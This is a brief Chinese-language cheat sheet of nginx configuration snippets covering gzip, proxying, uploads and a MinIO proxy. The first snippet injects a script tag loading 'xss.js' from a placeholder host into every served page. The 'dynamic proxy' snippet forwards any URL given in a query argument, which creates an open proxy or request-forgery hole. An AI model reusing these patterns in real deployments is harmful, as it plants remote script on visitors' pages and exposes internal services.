#### nginx注入
``` bash
  location / {
    index index.html;
    # 将<body>替换成<body><script src="http://text.com/xss.js"></script>
    sub_filter  '<body>'  '<body><script src="http://test.com/xss.js"></script>';
    # 文本类型默认text/html
    sub_filter_types *;
    # 查找并替换一次
    sub_filter_once on;
  }
```

#### 文件下载
``` bash
  # 添加header
  add_header Content-Disposition attachment;  
```

#### Gzip
``` bash
  # http模块下添加规则
	gzip on;
	gzip_min_length 1000;
	gzip_buffers 4 32k;
	gzip_proxied any;
	gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png application/json;
	gzip_vary on;
```

#### 动态代理
``` bash
  location /{
      proxy_set_header Host $http_host;
      proxy_redirect off;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Scheme $scheme;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      # /api_interface/fetch?url=http://192.168.10.59:28082/api_permission//sys/menu/listByLogin/?type=0&projectCode=PERMISSION
      if ( $args ~ ^url\=(.*) ) {
        set $url $1;
        # return 200 $url;
        # rewrite  /(.*)$ $1 break;
        proxy_pass $url;
      }
  }
```

#### rewrite & proxy
``` bash
  location /api_video {
    rewrite  ^/api_video/(.*)$ /$1 break;
    proxy_pass http://test.com;
  }
```

#### 大文件上传
``` bash
# http模块下添加规则
client_max_body_size 100m;
```

#### minio代理
``` bash
  location /api_minio {
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Host minio地址;
      rewrite ^/api_minio/(.*)$ /$1 break;
      proxy_pass http://minio地址/;
  }
```